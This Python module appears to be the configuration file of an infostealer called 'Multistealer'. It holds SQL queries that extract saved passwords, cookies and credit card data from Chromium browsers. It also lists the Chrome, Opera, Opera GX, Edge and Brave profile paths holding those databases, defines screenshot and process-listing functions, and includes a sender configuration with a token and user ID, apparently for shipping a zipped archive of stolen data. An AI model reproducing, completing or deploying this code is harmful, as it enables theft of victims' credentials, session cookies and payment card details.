from os import environ
from getpass import getuser
from dataclasses import dataclass


@dataclass
class ChromiumConfig:

    Variables: tuple = ("browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors")
    PasswordsSQL: str = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL: str = "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies"
    CardsSQL: str = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"


@dataclass
class MultistealerConfig:

    User: str = getuser()
    ZipName: str = f"{User}-st"
    StoragePath: str = rf"{environ['USERPROFILE']}\AppData"
    StorageFolder: str = "stink"

    Functions: tuple = ("system", "screen", "cookies", "passwords", "processes", "cards")

    ChromePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Cookies",
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Web Data",
        rf"{environ['USERPROFILE']}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
    )

    OperaGXPaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Cookies",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera GX Stable\Web Data",
        ""
    )

    OperaDefaultPaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Local State",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Cookies",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Login Data",
        rf"{environ['USERPROFILE']}\AppData\Roaming\Opera Software\Opera Stable\Web Data",
        ""
    )

    MicrosoftEdgePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Cookies",
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        rf"{environ['USERPROFILE']}\AppData\Local\Microsoft\Edge\User Data\Default\Web Data",
        ""
    )

    BravePaths: tuple = (
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data",
        ""
    )


@dataclass
class SystemConfig:

    User: str = getuser()
    Variables: tuple = ("storage_path", "storage_folder", "folder", "statuses", "errors")
    ProcessesDescription: str = "[Startup time] [Status] [CPU %] [RAM %] [Name]\n"


@dataclass
class SenderConfig:

    Variables: tuple = ("zip_name", "storage_path", "storage_folder", "token", "user_id", "errors")
